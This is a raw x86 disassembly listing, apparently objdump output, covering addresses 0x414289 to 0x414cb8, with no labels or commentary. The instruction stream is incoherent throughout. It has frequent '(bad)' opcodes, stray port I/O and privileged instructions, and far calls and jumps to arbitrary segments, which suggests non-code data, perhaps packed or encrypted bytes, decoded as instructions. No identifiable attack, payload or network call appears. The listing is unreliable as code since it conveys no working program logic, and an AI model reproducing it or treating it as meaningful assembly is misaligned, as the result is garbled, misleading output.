  414289:	and    BYTE PTR [edx+ebp*1],bh
  41428c:	das    
  41428d:	pusha  
  41428e:	fisubr DWORD PTR [eax-0x57]
  414291:	push   ebx
  414292:	sub    al,0x67
  414294:	stos   DWORD PTR es:[edi],eax
  414295:	rcl    edx,cl
  414297:	shr    BYTE PTR [esi-0x22],1
  41429a:	in     al,dx
  41429b:	xlat   BYTE PTR ds:[ebx]
  41429c:	fist   DWORD PTR [esi-0xd]
  41429f:	push   ss
  4142a0:	pop    ss
  4142a1:	rcr    BYTE PTR [esi+0x70697e01],1
  4142a7:	mov    ds:0x6594f882,eax
  4142ac:	out    0xb1,al
  4142ae:	aas    
  4142af:	inc    edi
  4142b0:	pop    es
  4142b1:	ret    0x25a
  4142b4:	inc    edi
	...
  414315:	add    BYTE PTR [ecx],al
  414317:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41431e:	idiv   BYTE PTR [esi-0x64]
  414321:	mov    ebx,0xdfe731e7
  414326:	add    dl,dl
  414328:	add    BYTE PTR [eax],al
  41432a:	pop    es
  41432b:	add    DWORD PTR [eax],eax
  41432d:	add    al,cl
  41432f:	jge    0x414361
  414331:	cmp    al,0x9a
  414333:	pop    esi
  414334:	or     cl,BYTE PTR [edi]
  414336:	sub    edi,DWORD PTR ds:0x6a1dd328
  41433c:	adc    DWORD PTR [ebx+esi*4+0x4a],edx
  414340:	jbe    0x414335
  414342:	xchg   esp,eax
  414343:	scas   al,BYTE PTR es:[edi]
  414344:	mov    ah,0x42
  414346:	outs   dx,BYTE PTR ds:[esi]
  414347:	ret    0xb473
  41434a:	aam    0x9e
  41434c:	mov    ds:0x5d55191,al
  414351:	jg     0x414355
  414353:	and    BYTE PTR [ebp-0x2f],ch
  414356:	push   ebp
  414357:	dec    DWORD PTR [ecx]
  414359:	jecxz  0x414328
  41435b:	push   esp
  41435c:	jae    0x4143d6
  41435e:	pop    ebx
  41435f:	ins    BYTE PTR es:[edi],dx
  414360:	test   al,0x92
  414362:	mov    ebx,0xa1860a5d
  414367:	das    
  414368:	fstp   QWORD PTR [edi+0x48]
  41436b:	rcl    esi,1
  41436d:	xchg   edi,eax
  41436e:	icebp  
  41436f:	cmp    dl,ch
  414371:	stc    
  414372:	dec    edi
  414373:	sbb    BYTE PTR [eax+0x51],0x3e
  414377:	mov    al,0x61
  414379:	dec    edx
  41437a:	sbb    eax,0x8add43a3
  41437f:	sbb    al,0x96
  414381:	push   ebx
  414382:	push   0x5409ce3
  414387:	int3   
  414388:	popf   
  414389:	cmp    esp,esi
  41438b:	aad    0x8
  41438d:	cmc    
  41438e:	popa   
  41438f:	adc    al,0x54
  414391:	jl     0x4143a8
  414393:	push   DWORD PTR [edx+0x41ba3a3d]
  414399:	pop    ds
  41439a:	sub    eax,0x46e11041
  41439f:	mov    bl,0x5a
  4143a1:	outs   dx,BYTE PTR ds:[esi]
  4143a2:	sub    al,BYTE PTR [ecx]
  4143a4:	xor    DWORD PTR ds:0x8db5717d,ecx
  4143aa:	lock fwait
  4143ac:	cmc    
  4143ad:	pop    ds
  4143ae:	cmp    eax,0xa8e84b28
  4143b3:	fwait
  4143b4:	icebp  
  4143b5:	jmp    0x41437d
  4143b7:	mov    dl,bl
  4143b9:	xlat   BYTE PTR ds:[ebx]
  4143ba:	jnp    0x414396
  4143bc:	xor    bl,BYTE PTR [edx]
  4143be:	or     ch,BYTE PTR [ebx]
  4143c0:	cli    
  4143c1:	(bad)  [edi+ebp*4-0x2b08b43]
  4143c8:	or     al,0x33
  4143ca:	imul   ebp,DWORD PTR [edi-0x5f29d234],0xffffffad
  4143d1:	aaa    
  4143d2:	(bad)  
  4143d3:	in     al,dx
  4143d4:	cmp    bh,BYTE PTR [eax-0x4ac598d5]
  4143da:	test   BYTE PTR [esi],ah
  4143dc:	(bad)  
  4143de:	scas   al,BYTE PTR es:[edi]
  4143df:	fisttp QWORD PTR [eax]
  4143e1:	repnz and bh,BYTE PTR [eax+0x48]
  4143e5:	out    0xcc,al
  4143e7:	in     al,dx
  4143e8:	(bad)  
  4143e9:	int3   
  4143ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143eb:	and    BYTE PTR [eax-0x5790a0e8],dl
  4143f1:	fs inc edx
  4143f3:	pop    ebx
  4143f4:	adc    bh,BYTE PTR [ebp-0x1b]
  4143f7:	call   0x2fb86169
  4143fc:	aam    0xd0
  4143fe:	call   0x1322:0x6246ee44
  414405:	sbb    al,0x8a
  414407:	cmp    eax,0x6ea634c1
  41440c:	push   edi
  41440d:	mov    dh,0x62
  41440f:	dec    esi
  414410:	jmp    0xc718:0x76db627e
  414417:	inc    edx
  414418:	gs sahf 
  41441a:	retf   0x6669
  41441d:	inc    edx
  41441e:	add    DWORD PTR [esi+0x32b31558],ebx
  414424:	jnp    0x41444c
  414426:	mov    WORD PTR [edx+0x2d],es
  414429:	loope  0x4143b8
  41442b:	aaa    
  41442c:	pop    edx
  41442d:	(bad)  
  41442e:	xor    al,0x26
  414430:	loope  0x4144a9
  414432:	sbb    eax,0x6dcb
	...
  414493:	add    BYTE PTR [eax],al
  414495:	add    BYTE PTR [ebx+0x73],bl
  414498:	inc    edx
  414499:	or     eax,0x775f3d6a
  41449e:	ss ins BYTE PTR es:[edi],dx
  4144a0:	pop    esp
  4144a1:	xchg   esp,eax
  4144a2:	jns    0x414455
  4144a4:	and    BYTE PTR ss:[ecx],cl
  4144a7:	rol    DWORD PTR [eax],cl
  4144a9:	add    BYTE PTR [edi],al
  4144ab:	add    DWORD PTR [eax],eax
  4144ad:	add    al,bl
  4144af:	repnz mov dl,0x8e
  4144b2:	mov    ch,0x5e
  4144b4:	mov    ch,0xec
  4144b6:	retf   0xb416
  4144b9:	mov    ecx,0xa886c3ff
  4144be:	push   0x4e6595f7
  4144c3:	and    al,0x4c
  4144c5:	or     dh,BYTE PTR [edi]
  4144c7:	fist   DWORD PTR [ecx+0x32e0fa47]
  4144cd:	arpl   WORD PTR [ecx-0x53],cx
  4144d0:	mov    ds:0x293ba73c,al
  4144d5:	js     0x414514
  4144d7:	and    edi,DWORD PTR [esi]
  4144d9:	scas   al,BYTE PTR es:[edi]
  4144da:	push   edx
  4144db:	xor    ch,ah
  4144dd:	call   0x7cfc:0x16276235
  4144e4:	loopne 0x4144dd
  4144e6:	loop   0x414480
  4144e8:	loope  0x414508
  4144ea:	cmp    eax,0x7dc25aa1
  4144ef:	mul    bl
  4144f1:	cmc    
  4144f2:	test   eax,0xbd1fdd68
  4144f7:	ret    
  4144f8:	retf   
  4144f9:	push   esp
  4144fa:	push   ebp
  4144fb:	xor    al,0x47
  4144fd:	jl     0x4144dc
  4144ff:	mul    bl
  414501:	adc    DWORD PTR [ecx],ecx
  414503:	ins    BYTE PTR es:[edi],dx
  414504:	mov    eax,ds:0x2e090a4
  414509:	jge    0x4144c8
  41450b:	inc    esp
  41450c:	mov    ?,WORD PTR [edi+0x10565707]
  414512:	add    eax,DWORD PTR [ecx+0x6ee2b1fa]
  414518:	sub    al,0x4b
  41451a:	inc    esi
  41451b:	lahf   
  41451c:	pop    eax
  41451d:	sahf   
  41451e:	fist   WORD PTR [edx]
  414520:	stos   BYTE PTR es:[edi],al
  414521:	pushf  
  414522:	and    BYTE PTR [esi+ebx*4+0x16d4311d],0x4e
  41452a:	cmp    eax,eax
  41452c:	sub    ebp,DWORD PTR [ecx+0x3]
  41452f:	add    ah,al
  414531:	adc    al,0xc
  414533:	lds    esi,FWORD PTR [ebp-0x6c]
  414536:	push   eax
  414537:	loop   0x4144c2
  414539:	call   0x69c8:0x88a74900
  414540:	add    bl,BYTE PTR [eax]
  414542:	inc    ebx
  414543:	xchg   DWORD PTR [esi],eax
  414545:	add    bh,bl
  414547:	shl    BYTE PTR [ebx],0x3e
  41454a:	scas   al,BYTE PTR es:[edi]
  41454b:	add    eax,0x8c672506
  414550:	out    dx,al
  414551:	dec    ebx
  414552:	dec    esp
  414553:	jns    0x4145d3
  414555:	adc    eax,0x144fe94d
  41455a:	add    ch,ch
  41455c:	mov    al,ds:0xc40824c9
  414561:	jb     0x414553
  414563:	aaa    
  414564:	loop   0x414559
  414566:	fs fcmovnbe st,st(4)
  414569:	popf   
  41456a:	sub    DWORD PTR [ecx+0x63],ebp
  41456d:	lea    ebx,[edi]
  41456f:	jg     0x414506
  414571:	retf   
  414572:	fild   WORD PTR [eax]
  414574:	in     eax,0x7c
  414576:	es test edx,ecx
  414579:	jmp    0x78cd:0x54ec9686
  414580:	and    eax,0x858eb30e
  414585:	pop    ds
  414586:	and    ch,BYTE PTR [edi-0xe]
  414589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41458a:	imul   ecx,DWORD PTR [ebx],0xffffffdd
  41458d:	sub    BYTE PTR [edx-0xace324e],dl
  414593:	mov    ah,0xdf
  414595:	mov    al,0x1a
  414597:	lods   al,BYTE PTR ds:[esi]
  414598:	rcl    DWORD PTR [ebp+ebp*8+0x561e3959],1
  41459f:	loop   0x41460e
  4145a1:	mov    edx,0xbe6f2313
  4145a6:	in     al,0x4b
  4145a8:	xor    edx,ebp
  4145aa:	popf   
  4145ab:	(bad)  
  4145ad:	enter  0x900c,0x75
  4145b1:	xor    dh,bh
  4145b3:	clc    
  4145b4:	and    BYTE PTR [eax],al
	...
  414616:	jg     0x414676
  414618:	cmc    
  414619:	ins    DWORD PTR es:[edi],dx
  41461a:	cmc    
  41461b:	out    dx,eax
  41461c:	call   FWORD PTR [esi+0xd]
  41461f:	mov    al,ds:0x24330dc2
  414624:	pop    ebp
  414625:	mov    edi,0xd410
  41462a:	pop    es
  41462b:	add    DWORD PTR [eax],eax
  41462d:	add    BYTE PTR [edx-0x22],dh
  414630:	lea    ebp,[edi]
  414632:	retf   
  414633:	xchg   ebx,eax
  414634:	pushf  
  414635:	mov    al,0xdd
  414637:	adc    ah,al
  414639:	scas   al,BYTE PTR es:[edi]
  41463a:	jmp    0xda8e:0x11dad544
  414641:	mov    ebp,0xba56268f
  414646:	imul   edx,DWORD PTR [edx+0x1e18b952],0xd73e5111
  414650:	inc    ecx
  414651:	pop    ebp
  414652:	push   0xffffffe7
  414654:	jecxz  0x4146b0
  414656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414657:	push   ss
  414658:	(bad)  
  414659:	mov    DWORD PTR [esi-0x1c571cc1],edx
  41465f:	jl     0x4146b5
  414661:	inc    esi
  414662:	(bad)  
  414663:	(bad)  
  414664:	mov    ebp,0x39c71cb8
  414669:	outs   dx,DWORD PTR ds:[esi]
  41466a:	out    0x44,eax
  41466c:	cmp    al,0xc1
  41466e:	ja     0x4146e0
  414670:	aam    0x27
  414672:	js     0x4146bc
  414674:	ins    DWORD PTR es:[edi],dx
  414675:	pcmpgtw mm4,QWORD PTR [ecx-0x7f]
  414679:	sub    al,0xcf
  41467b:	xchg   esi,eax
  41467c:	test   BYTE PTR [edi+0x73],ah
  41467f:	repz sbb eax,0xf7ade34b
  414685:	adc    ecx,edx
  414687:	xchg   ebp,eax
  414688:	hlt    
  414689:	iret   
  41468a:	xchg   esi,eax
  41468b:	adc    al,0x68
  41468d:	je     0x4146b1
  41468f:	(bad)  
  414690:	fcmove st,st(2)
  414692:	iret   
  414693:	call   0x3c89:0x41010beb
  41469a:	aam    0x4b
  41469c:	pop    esp
  41469d:	inc    ecx
  41469e:	scas   eax,DWORD PTR es:[edi]
  41469f:	push   ss
  4146a0:	mov    ah,0x47
  4146a2:	ins    DWORD PTR es:[edi],dx
  4146a3:	jbe    0x4146bc
  4146a5:	adc    ebp,DWORD PTR [eax+0x0]
  4146a8:	xor    BYTE PTR [edi+ebx*4-0x777eda7d],bl
  4146af:	jns    0x41471d
  4146b1:	push   ds
  4146b2:	inc    edi
  4146b3:	pop    esp
  4146b4:	xor    DWORD PTR [esi],esp
  4146b6:	aaa    
  4146b7:	push   esp
  4146b8:	rcr    DWORD PTR [ebp+eiz*2+0x718d66bf],0x4e
  4146c0:	push   0x488463e2
  4146c5:	outs   dx,DWORD PTR ds:[esi]
  4146c6:	push   0x58a914e3
  4146cb:	popa   
  4146cc:	xchg   esi,eax
  4146cd:	(bad)  
  4146ce:	popa   
  4146cf:	mov    WORD PTR [ebp-0x7e1a4634],fs
  4146d5:	je     0x4146b6
  4146d7:	mov    eax,0x4a8999c
  4146dc:	pop    ecx
  4146dd:	mov    edi,0xd4be2b2a
  4146e2:	cmp    BYTE PTR [esi-0xa2f8787],bl
  4146e8:	jecxz  0x414701
  4146ea:	fwait
  4146eb:	lds    ecx,FWORD PTR [ecx-0x3d0f02c3]
  4146f1:	xchg   ecx,eax
  4146f2:	pop    eax
  4146f3:	enter  0xc281,0xec
  4146f7:	pop    esi
  4146f8:	fcmovnb st,st(0)
  4146fa:	mul    cl
  4146fc:	repnz das 
  4146fe:	add    BYTE PTR [edi-0x25],al
  414701:	adc    ah,0xb4
  414704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414705:	or     esp,eax
  414707:	stc    
  414708:	ror    esp,1
  41470a:	fistp  QWORD PTR [esi]
  41470c:	mov    BYTE PTR [eax+0x576adf8e],al
  414712:	ror    DWORD PTR [edx+0x3ff34cbf],0xdd
  414719:	inc    BYTE PTR [ecx-0x19ead71b]
  41471f:	mov    eax,ds:0x9f5fdb43
  414724:	mov    dh,0xfa
  414726:	or     esp,ecx
  414728:	sub    ch,bh
  41472a:	mov    esi,0xc2968e3d
  41472f:	scas   al,BYTE PTR es:[edi]
  414730:	neg    DWORD PTR [ebx-0x54]
  414733:	jbe    0x4146e2
	...
  414795:	add    BYTE PTR [esi+0x2f],bh
  414798:	add    DWORD PTR [ebp+0x51],ebp
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	jle    0x4147dd
  41479e:	aam    0x28
  4147a0:	aam    0xa9
  4147a2:	out    dx,eax
  4147a3:	cmp    DWORD PTR [ebx],ecx
  4147a5:	mov    ebx,0xd517
  4147aa:	pop    es
  4147ab:	add    DWORD PTR [eax],eax
  4147ad:	add    BYTE PTR [edx-0x73],al
  4147b0:	sub    eax,0x1d430d91
  4147b5:	das    
  4147b6:	xchg   edi,ebp
  4147b8:	and    BYTE PTR [ebp+0x3],ah
  4147bb:	repnz es (bad) 
  4147be:	pop    esp
  4147bf:	mov    eax,0x135c4f93
  4147c4:	lds    esp,FWORD PTR ss:[ebx]
  4147c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147c8:	mov    ds:0xd739c405,eax
  4147cd:	loop   0x414770
  4147cf:	in     eax,0x85
  4147d1:	jg     0x4147ac
  4147d3:	popf   
  4147d4:	sub    BYTE PTR [eax],0x9e
  4147d7:	ja     0x4147bd
  4147d9:	cdq    
  4147da:	lods   al,BYTE PTR ds:[esi]
  4147db:	or     ah,BYTE PTR [esi]
  4147dd:	pop    ecx
  4147de:	lock jge 0x414775
  4147e1:	mov    BYTE PTR [esi-0x76],al
  4147e4:	(bad)  
  4147e5:	and    edx,DWORD PTR [eax-0x62036a82]
  4147eb:	dec    ebx
  4147ec:	outs   dx,BYTE PTR ds:[esi]
  4147ed:	xor    eax,0x7802d047
  4147f2:	pop    ecx
  4147f3:	cmp    al,0xdf
  4147f5:	shr    BYTE PTR [edi-0x37],cl
  4147f8:	sbb    DWORD PTR [edi],ebx
  4147fa:	(bad)  
  4147fb:	clc    
  4147fc:	xor    ch,dh
  4147fe:	cld    
  4147ff:	in     al,0x16
  414801:	sbb    eax,0x603321a3
  414806:	test   eax,0x39d8b706
  41480b:	inc    esp
  41480c:	jp     0x4147d1
  41480e:	mov    ch,ah
  414810:	xchg   ebp,eax
  414811:	leave  
  414812:	in     eax,0x76
  414814:	xor    ecx,DWORD PTR [edx+0x61]
  414817:	enter  0x9ca3,0x73
  41481b:	mov    esp,0x2b67c26d
  414820:	xchg   edx,eax
  414821:	fwait
  414822:	mov    ch,0x6
  414824:	sbb    ax,0x433e
  414828:	mov    edx,0xeb50af0c
  41482d:	inc    edi
  41482e:	sbb    eax,0x9cd0b481
  414833:	clc    
  414834:	das    
  414835:	cmp    ebp,ebx
  414837:	pop    edi
  414838:	adc    BYTE PTR [edx+0x277ddeb8],cl
  41483e:	fcmovnbe st,st(7)
  414840:	pusha  
  414841:	sub    eax,0xdebdf56c
  414846:	pop    es
  414847:	cmp    DWORD PTR [ecx+0x77],0x4e
  41484b:	lods   eax,DWORD PTR ds:[esi]
  41484c:	pushf  
  41484d:	retf   0xce98
  414850:	jle    0x4148a7
  414852:	push   ss
  414853:	adc    ah,bl
  414855:	mov    cl,0x3a
  414857:	imul   edx,DWORD PTR gs:[ecx],0x67
  41485b:	xor    cl,BYTE PTR [ecx]
  41485d:	xchg   esp,edi
  41485f:	push   ss
  414860:	fidiv  DWORD PTR [edx+0x10dc4a51]
  414866:	xor    BYTE PTR [edx-0xb],dl
  414869:	mov    DWORD PTR [edx],ebx
  41486b:	dec    ebx
  41486c:	ss dec edi
  41486e:	ins    DWORD PTR es:[edi],dx
  41486f:	mov    DWORD PTR [eax+0x7b],0xb6d92d0b
  414876:	adc    BYTE PTR [edi],dh
  414878:	add    ecx,DWORD PTR [edi]
  41487a:	(bad)  [edi-0x19]
  41487d:	mov    esp,0xc4d9ec2
  414882:	fwait
  414883:	xor    esp,DWORD PTR [edi+0x19351aee]
  414889:	xlat   BYTE PTR ds:[ebx]
  41488a:	jmp    0x29509d11
  41488f:	and    BYTE PTR [esp+esi*4-0x34],0xb8
  414894:	dec    edi
  414895:	loope  0x41482a
  414897:	scas   eax,DWORD PTR es:[edi]
  414898:	cld    
  414899:	adc    al,0x79
  41489b:	xor    BYTE PTR [esi],al
  41489d:	lea    esi,[ecx+0x3dd9c4e6]
  4148a3:	cwde   
  4148a4:	xchg   esp,eax
  4148a5:	mov    WORD PTR [ecx],gs
  4148a7:	mov    ds:0x39888bc9,eax
  4148ac:	xchg   esp,eax
  4148ad:	xchg   esi,eax
  4148ae:	mov    gs,edi
  4148b0:	mov    al,ds:0xa6b59988
	...
  414915:	add    BYTE PTR [ebx],cl
  414917:	jle    0x4148eb
  414919:	and    esi,edi
  41491b:	scas   eax,DWORD PTR es:[edi]
  41491c:	sti    
  41491d:	jle    0x4148ac
  41491f:	sbb    eax,0xdf59c1ed
  414924:	push   ss
  414925:	jae    0x414945
  414927:	(bad)  
  414928:	add    BYTE PTR [eax],al
  41492a:	pop    es
  41492b:	add    DWORD PTR [eax],eax
  41492d:	add    BYTE PTR [eax+edx*4+0x69a930c5],cl
  414934:	repnz or eax,0xdffdf5bd
  41493a:	mov    bh,0x3b
  41493c:	xchg   edx,eax
  41493d:	fistp  QWORD PTR [esi+0x20590c6d]
  414943:	scas   eax,DWORD PTR es:[edi]
  414944:	mov    cl,0x93
  414946:	aad    0x9e
  414948:	outs   dx,BYTE PTR ds:[esi]
  414949:	retf   0x5b67
  41494c:	pop    eax
  41494d:	pushf  
  41494e:	push   ecx
  41494f:	add    BYTE PTR [eax-0x22aec5e9],cl
  414955:	mov    dh,0xfc
  414957:	mov    ah,0x6
  414959:	inc    ebp
  41495a:	stos   DWORD PTR es:[edi],eax
  41495b:	jno    0x4148f6
  41495d:	lahf   
  41495e:	xor    al,0x90
  414960:	pop    es
  414961:	cs std 
  414963:	repnz cs inc eax
  414966:	not    DWORD PTR [ebx-0x34]
  414969:	push   edi
  41496a:	sbb    cl,BYTE PTR [eax+ebx*2]
  41496d:	jg     0x41499a
  41496f:	and    edi,DWORD PTR [ebx+0x55]
  414972:	ins    BYTE PTR es:[edi],dx
  414973:	cld    
  414974:	mov    bl,0xe8
  414976:	cmp    BYTE PTR [eax],ch
  414978:	stos   DWORD PTR es:[edi],eax
  414979:	or     eax,0x778d1e01
  41497e:	sar    esp,1
  414980:	push   edx
  414981:	or     al,0x96
  414983:	int    0xa3
  414985:	xchg   bp,ax
  414987:	fwait
  414988:	or     edx,DWORD PTR [edx+0x345e162e]
  41498e:	cmp    dl,BYTE PTR [ebp-0x2031beb0]
  414994:	lahf   
  414995:	jae    0x41491a
  414997:	mov    ds:0x2152bb9c,al
  41499c:	imul   esi,DWORD PTR [esi-0x1a],0xd360e4d
  4149a3:	mov    DWORD PTR ds:[edi+eax*4-0x53b951cd],edi
  4149ab:	das    
  4149ac:	loope  0x41492f
  4149ae:	sbb    cl,ch
  4149b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149b1:	inc    edx
  4149b2:	aad    0x9
  4149b4:	and    eax,0x6c7d4357
  4149b9:	inc    esi
  4149ba:	cdq    
  4149bb:	mov    esp,DWORD PTR [eax+0x3c]
  4149be:	div    BYTE PTR [ecx+0xa]
  4149c1:	jge    0x4149f6
  4149c3:	inc    ebp
  4149c4:	shl    esi,1
  4149c6:	call   0x4fb236cc
  4149cb:	fidiv  DWORD PTR [esi+0x2f]
  4149ce:	repz push 0x4aca173b
  4149d4:	inc    ecx
  4149d5:	mov    dl,0x73
  4149d7:	cwde   
  4149d8:	mov    edx,DWORD PTR [eax-0x21]
  4149db:	call   0x7eddbd11
  4149e0:	jmp    FWORD PTR [ecx+ecx*2-0x2b]
  4149e4:	xchg   edi,eax
  4149e5:	sbb    ebx,DWORD PTR [eax+edx*1-0x5b]
  4149e9:	clc    
  4149ea:	ins    BYTE PTR es:[edi],dx
  4149eb:	xchg   ebx,eax
  4149ec:	mov    esp,0x8616e012
  4149f1:	imul   eax,DWORD PTR [eax],0xffffff88
  4149f4:	mov    ah,0xe2
  4149f6:	(bad)  
  4149f8:	call   0xc10ccc1d
  4149fd:	dec    esp
  4149fe:	sti    
  4149ff:	jp     0x414a72
  414a01:	sahf   
  414a02:	pop    ecx
  414a03:	aas    
  414a04:	outs   dx,BYTE PTR ds:[esi]
  414a05:	fs call 0x1f42:0x9d81a4fa
  414a0d:	(bad)  
  414a0e:	js     0x4149ba
  414a10:	call   0xe001:0x10db1138
  414a17:	xchg   edx,eax
  414a18:	dec    eax
  414a19:	add    BYTE PTR [esi-0x6f],bh
  414a1c:	mov    ebp,0x93800168
  414a21:	sbb    BYTE PTR [edx+0x7ab04aec],bl
  414a27:	retf   
  414a28:	push   ebx
  414a29:	xchg   ebx,eax
  414a2a:	int    0xae
  414a2c:	dec    ecx
  414a2d:	jae    0x414a92
  414a2f:	jmp    ecx
  414a31:	outs   dx,DWORD PTR ds:[esi]
  414a32:	in     al,0x6f
  414a34:	xor    eax,DWORD PTR [eax]
	...
  414a96:	lahf   
  414a97:	fnstcw WORD PTR [esi]
  414a99:	ss jle 0x414a93
  414a9c:	lahf   
  414a9d:	stc    
  414a9e:	and    al,0x64
  414aa0:	mov    dl,0x1b
  414aa2:	test   DWORD PTR ds:0xd725c0dc,ecx
  414aa8:	add    BYTE PTR [eax],al
  414aaa:	pop    es
  414aab:	add    DWORD PTR [eax],eax
  414aad:	add    BYTE PTR [ebx-0x20],dh
  414ab0:	and    BYTE PTR [eax+0x3f],ch
  414ab3:	repnz pop es
  414ab5:	sub    BYTE PTR [edi-0x45],dh
  414ab8:	pop    ebx
  414ab9:	pop    ecx
  414aba:	dec    ecx
  414abb:	(bad)  
  414abc:	push   ss
  414abd:	mov    al,0x86
  414abf:	ja     0x414ad3
  414ac1:	les    edx,FWORD PTR [ecx]
  414ac3:	lea    ebx,[edi]
  414ac5:	push   edi
  414ac6:	sub    DWORD PTR [esi],edi
  414ac8:	pop    es
  414ac9:	imul   esp,ebx,0x6fc85860
  414acf:	xor    eax,0x2257dae6
  414ad4:	and    ah,BYTE PTR [ebx+ecx*1+0x62]
  414ad8:	repnz or eax,0x6ed35178
  414ade:	in     al,0x22
  414ae0:	and    ah,BYTE PTR [eax]
  414ae2:	push   0xf6156057
  414ae7:	in     al,0xea
  414ae9:	push   esi
  414aea:	int3   
  414aeb:	lock push esp
  414aed:	pop    ds
  414aee:	and    dh,al
  414af0:	mov    bl,0x79
  414af2:	add    DWORD PTR es:[eax],ecx
  414af5:	xor    ebp,ebp
  414af7:	sar    dl,0xf
  414afa:	mov    edx,0xab85f836
  414aff:	jmp    0x414ab3
  414b01:	ins    BYTE PTR es:[edi],dx
  414b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b03:	xor    DWORD PTR [ebp+eiz*2+0x6e],eax
  414b07:	jns    0x414b00
  414b09:	call   0xcb617871
  414b0e:	mov    bl,0x6a
  414b10:	nop
  414b11:	push   cs
  414b12:	add    al,cl
  414b14:	mov    dl,0xf6
  414b16:	jmp    0x98df2eb1
  414b1b:	test   DWORD PTR [ebx-0x4b],ecx
  414b1e:	dec    ebp
  414b1f:	ss (bad) 
  414b21:	lahf   
  414b22:	jne    0x414b19
  414b24:	rcr    BYTE PTR [ecx],cl
  414b26:	inc    eax
  414b27:	stc    
  414b28:	mov    esp,0xbb77809f
  414b2d:	sub    DWORD PTR [esi],0xfffffff5
  414b30:	sub    eax,0x3ed120d8
  414b35:	in     eax,dx
  414b36:	push   ebx
  414b37:	jle    0x414b89
  414b39:	ret    0x60c1
  414b3c:	and    BYTE PTR [esi*1+0x4595536f],ah
  414b43:	popf   
  414b44:	pop    ds
  414b45:	xor    BYTE PTR [ecx+0x49],al
  414b48:	imul   ecx
  414b4a:	inc    DWORD PTR [eax-0x329c232b]
  414b50:	stc    
  414b51:	out    dx,al
  414b52:	sti    
  414b53:	cmp    al,0x48
  414b55:	dec    esp
  414b56:	mov    dh,0x3b
  414b58:	jnp    0x414b0c
  414b5a:	adc    ecx,DWORD PTR [ecx+eiz*2+0x3b]
  414b5e:	sbb    cl,BYTE PTR [ebp-0x6513631f]
  414b64:	ss cli 
  414b66:	ficomp DWORD PTR [edx+edi*8-0x3c4cdbc2]
  414b6d:	sub    al,0x31
  414b6f:	out    dx,al
  414b70:	adc    cl,BYTE PTR [eax]
  414b72:	imul   edx,DWORD PTR [ebp+0x50],0xffffffd2
  414b76:	xchg   ebx,eax
  414b77:	pop    ebp
  414b78:	or     DWORD PTR [esi-0x57a883a6],ecx
  414b7e:	xchg   ecx,eax
  414b7f:	jl     0x414bfc
  414b81:	sbb    bh,0x4b
  414b84:	jle    0x414c05
  414b86:	push   ecx
  414b87:	(bad)  
  414b88:	loopne 0x414b7b
  414b8a:	div    DWORD PTR [ebp-0x5009a264]
  414b90:	mov    al,ds:0xb23191ee
  414b95:	sub    dh,BYTE PTR [ecx-0xb]
  414b98:	inc    ebx
  414b99:	jne    0x414b51
  414b9b:	inc    esp
  414b9c:	sbb    esp,DWORD PTR [edi-0x7a]
  414b9f:	imul   edx,DWORD PTR ds:0x8e58450a,0xffffffd6
  414ba6:	loopne 0x414bcb
  414ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ba9:	bound  esp,QWORD PTR [ebx+0x3fb7a147]
  414baf:	clc    
  414bb0:	adc    cl,BYTE PTR [edx+edx*1+0x7b]
  414bb4:	xor    al,BYTE PTR [eax]
	...
  414c16:	xor    al,0x64
  414c18:	push   ds
  414c19:	jl     0x414c79
  414c1b:	jle    0x414c93
  414c1d:	ins    BYTE PTR es:[edi],dx
  414c1e:	inc    edi
  414c1f:	xor    ah,BYTE PTR [ecx]
  414c21:	push   edx
  414c22:	(bad)  
  414c23:	std    
  414c24:	cs clc 
  414c26:	sub    al,0xd8
  414c28:	add    BYTE PTR [eax],al
  414c2a:	pop    es
  414c2b:	add    DWORD PTR [eax],eax
  414c2d:	add    BYTE PTR [eax+0x614b17cb],dh
  414c33:	ror    DWORD PTR [edx+0x1746c24a],0x2e
  414c3a:	xor    ecx,DWORD PTR [edi-0x29]
  414c3d:	adc    al,0x60
  414c3f:	pop    ebx
  414c40:	mov    ecx,0xd27b70a1
  414c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c46:	outs   dx,DWORD PTR ds:[esi]
  414c47:	sbb    eax,0x68ea95a5
  414c4c:	jae    0x414c3a
  414c4e:	inc    ebx
  414c4f:	inc    edx
  414c50:	and    esp,ecx
  414c52:	push   edx
  414c53:	lds    ecx,FWORD PTR [esi*8+0x36a211ee]
  414c5a:	mov    al,0xa2
  414c5c:	loopne 0x414c0a
  414c5e:	sbb    cl,ah
  414c60:	push   edi
  414c61:	shl    ah,0x80
  414c64:	inc    edi
  414c65:	dec    ecx
  414c66:	push   eax
  414c67:	push   esi
  414c68:	sahf   
  414c69:	(bad)  
  414c6a:	retf   0x6348
  414c6d:	pop    ecx
  414c6e:	sbb    BYTE PTR [ecx+0x48c3e185],0x91
  414c75:	psadbw mm0,mm3
  414c78:	stos   DWORD PTR es:[edi],eax
  414c79:	arpl   WORD PTR [ebp+0xb],sp
  414c7c:	fiadd  DWORD PTR [ecx]
  414c7e:	fidivr DWORD PTR [ebp+0x1bf5a486]
  414c84:	xchg   edx,eax
  414c85:	jo     0x414c0a
  414c87:	pop    ebp
  414c88:	jnp    0x414c28
  414c8a:	dec    ecx
  414c8b:	int    0xeb
  414c8d:	xchg   esp,eax
  414c8e:	test   BYTE PTR [bp+di+0x4e],bl
  414c92:	int    0x39
  414c94:	icebp  
  414c95:	in     eax,0x9f
  414c97:	out    dx,eax
  414c98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c99:	ins    BYTE PTR es:[edi],dx
  414c9a:	push   DWORD PTR [edi-0x38]
  414c9d:	add    bl,bh
  414c9f:	cld    
  414ca0:	xchg   DWORD PTR ds:0x1002cce1,ebp
  414ca6:	xchg   ebp,eax
  414ca7:	imul   esi,DWORD PTR [edi+0x32],0x3
  414cab:	(bad)  
  414cac:	loopne 0x414c32
  414cae:	cwde   
  414caf:	es nop
  414cb1:	cwde   
  414cb2:	dec    ebx
  414cb3:	aad    0x54
  414cb5:	jo     0x414c39
  414cb7:	fwait
  414cb8:	cld    
